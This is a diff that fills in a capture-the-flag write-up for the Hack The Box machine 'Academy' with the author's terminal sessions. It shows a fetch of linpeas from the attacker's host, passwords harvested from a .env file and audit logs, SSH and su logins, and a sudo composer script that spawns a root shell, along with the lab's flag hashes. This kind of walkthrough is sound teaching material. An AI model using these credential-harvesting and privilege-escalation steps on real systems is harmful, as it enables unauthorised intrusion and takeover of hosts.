@@ -394,68 +394,204 @@ We see **user.txt** in */home/cry0l1t3* and inteteresting *.sudo_as_admin_succes
 Let's Download [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) and check way privilege escalation.
 
 ```
-wget
+wget http://10.10.14.133:9191/linpeas.sh -O linpeas.sh
 ```
 
-And we find password in /
+And we find password in /var/www/html/academy/.env:
 
 ```
-pass
+[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside key folders (limit 70) - no PHP files
+
+...
+
+/var/www/html/academy/.env:DB_PASSWORD=mySup3rP4s5w0rd!!
 ```
 
-Try to login as cry0l1t3 with password.
+Try to login as **cry0l1t3** with password **mySup3rP4s5w0rd!!**.
 
 ```
-su cry0l1t3
+┌──(root💀kali)-[/home/kali]
+└─# ssh cry0l1t3@10.10.10.215
+cry0l1t3@10.10.10.215's password: 
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed 03 Feb 2021 03:39:17 PM UTC
+
+  System load:             0.0
+  Usage of /:              44.6% of 15.68GB
+  Memory usage:            18%
+  Swap usage:              0%
+  Processes:               204
+  Users logged in:         0
+  IPv4 address for ens160: 10.10.10.215
+  IPv6 address for ens160: dead:beef::250:56ff:feb9:becf
+
+
+0 updates can be installed immediately.
+0 of these updates are security updates.
+
+
+Last login: Wed Aug 12 21:58:45 2020 from 10.10.14.2
+$ /bin/bash
+cry0l1t3@academy:~$ 
 ```
 
 And we have success. Get user.txt
 
 ```
+cry0l1t3@academy:~$ ls
 user.txt
+cry0l1t3@academy:~$ cat user.txt 
+5b915c0e84a9eaed49d307417ca6e0d8
 ```
 
-Checkig privelages.
+Checkig privelages and nothing.
 ```
-sudo -l
+cry0l1t3@academy:~$ sudo -l
+[sudo] password for cry0l1t3: 
+Sorry, user cry0l1t3 may not run sudo on academy.
 ```
 
-and all users privelages:
-```
+And lets check all users privelages:
 
 ```
-Сry0l1t3 belongs to the adminsitrator group, that can read logs in /var/log
+[+] All users & groups
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
+uid=1000(egre55) gid=1000(egre55) groups=1000(egre55),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
+uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
+uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
+uid=1003(21y4d) gid=1003(21y4d) groups=1003(21y4d)
+uid=1004(ch4p) gid=1004(ch4p) groups=1004(ch4p)
+uid=1005(g0blin) gid=1005(g0blin) groups=1005(g0blin)
+```
+
+*Сry0l1t3* belongs to the *adminsitrator group*, that can read logs in */var/log*. 
+*egre55 has* sudo privelages. Interesting..
 
 Run linPEAS as Сry0l1t3 to check every logs.
 
-We find mrb3n password:
+We find **mrb3n's password** in */var/log/audit/audit.log* :
 
 ```
-pass
+[+] Checking for TTY (sudo/su) passwords in audit logs
+1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>
+2. 08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>
 ```
 
 Login as mrb3n and check privelages
 ```
-sudo -l
+cry0l1t3@academy:~$ su mrb3n
+Password: 
+$ /bin/bash
+mrb3n@academy:/home/cry0l1t3$ sudo -l
+[sudo] password for mrb3n: 
+Sorry, try again.
+[sudo] password for mrb3n: 
+Matching Defaults entries for mrb3n on academy:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User mrb3n may run the following commands on academy:
+    (ALL) /usr/bin/composer
+mrb3n@academy:/home/cry0l1t3$ 
 ```
 
-He can run as sudo **/usr/bin composer**. Lets run composer.
+He can execute as sudo **/usr/bin composer**. Lets run composer.
+
 ```
-composer
+mrb3n@academy:/home/cry0l1t3$ /usr/bin/composer
+PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
+PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
+   ______
+  / ____/___  ____ ___  ____  ____  ________  _____
+ / /   / __ \/ __ `__ \/ __ \/ __ \/ ___/ _ \/ ___/
+/ /___/ /_/ / / / / / / /_/ / /_/ (__  )  __/ /
+\____/\____/_/ /_/ /_/ .___/\____/____/\___/_/
+                    /_/
+Composer 1.10.1 2020-03-13 20:34:27
+
+Usage:
+  command [options] [arguments]
+
+Options:
+  -h, --help                     Display this help message
+  -q, --quiet                    Do not output any message
+  -V, --version                  Display this application version
+      --ansi                     Force ANSI output
+      --no-ansi                  Disable ANSI output
+  -n, --no-interaction           Do not ask any interactive question
+      --profile                  Display timing and memory usage information
+      --no-plugins               Whether to disable plugins.
+  -d, --working-dir=WORKING-DIR  If specified, use the given directory as working directory.
+      --no-cache                 Prevent use of the cache
+  -v|vv|vvv, --verbose           Increase the verbosity of messages: 1 for normal output, 2 for more verbose output and 3 for debug
+
+Available commands:
+  about                Shows the short information about Composer.
+  archive              Creates an archive of this composer package.
+  browse               [home] Opens the package's repository URL or homepage in your browser.
+  check-platform-reqs  Check that platform requirements are satisfied.
+  clear-cache          [clearcache|cc] Clears composer's internal package cache.
+  config               Sets config options.
+  create-project       Creates new project from a package into given directory.
+  depends              [why] Shows which packages cause the given package to be installed.
+  diagnose             Diagnoses the system to identify common errors.
+  dump-autoload        [dumpautoload] Dumps the autoloader.
+  exec                 Executes a vendored binary/script.
+  fund                 Discover how to help fund the maintenance of your dependencies.
+  global               Allows running commands in the global composer dir ($COMPOSER_HOME).
+  help                 Displays help for a command
+  init                 Creates a basic composer.json file in current directory.
+  install              [i] Installs the project dependencies from the composer.lock file if present, or falls back on the composer.json.
+  licenses             Shows information about licenses of dependencies.
+  list                 Lists commands
+  outdated             Shows a list of installed packages that have updates available, including their latest version.
+  prohibits            [why-not] Shows which packages prevent the given package from being installed.
+  remove               Removes a package from the require or require-dev.
+  require              Adds required packages to your composer.json and installs them.
+  run-script           [run] Runs the scripts defined in composer.json.
+  search               Searches for packages.
+  show                 [info] Shows information about packages.
+  status               Shows a list of locally modified packages, for packages installed from source.
+  suggests             Shows package suggestions.
+  update               [u|upgrade] Upgrades your dependencies to the latest version according to composer.json, and updates the composer.lock file.
+  validate             Validates a composer.json and composer.lock.
 ```
+We see, that composer can run scriots from composer.json `run-script           [run] Runs the scripts defined in composer.json.`
 
 Ok, we need json file in /tmp to run it. Also composer can run scripts, so...
 Checking [GTFObins](https://gtfobins.github.io/gtfobins/composer/)
 
 ```
-TF=$(mktemp -d)
-echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
-sudo composer --working-dir=$TF run-script x
+mrb3n@academy:/home/cry0l1t3$ cd /tmp
+mrb3n@academy:/tmp$ nano composer.json
+mrb3n@academy:/tmp$ cat composer.json 
+{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}
+
+mrb3n@academy:/tmp$ sudo /usr/bin/composer run-script x
+[sudo] password for mrb3n:
+PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
+PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
+Do not run Composer as root/super user! See https://getcomposer.org/root for details
+> /bin/sh -i 0<&3 1>&3 2>&3
+# whoami
+root
 ```
 
 And we got root /bin/bash. Get root.txt
+
 ```
-root.txt
+> /bin/sh -i 0<&3 1>&3 2>&3
+# whoami
+root
+# cat /root/root.txt
+9b3eae6531116ac3d98f26078b31208a
 ```
 
 # Resources
